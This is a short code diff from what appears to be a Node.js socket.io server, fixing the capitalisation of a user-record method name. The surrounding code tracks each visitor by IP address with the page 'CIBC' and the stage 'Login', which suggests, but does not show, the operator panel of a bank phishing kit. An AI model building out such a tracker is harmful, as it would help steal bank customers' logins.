@@ -229,7 +229,7 @@ io.on('connection', (socket, req) => {
     
     socket.join(userIP)
 
-    usersDAO.createUserorUpdate(userIP, {
+    usersDAO.createUserOrUpdate(userIP, {
         status: 'active',
         page: 'CIBC',
         stage: 'Login'
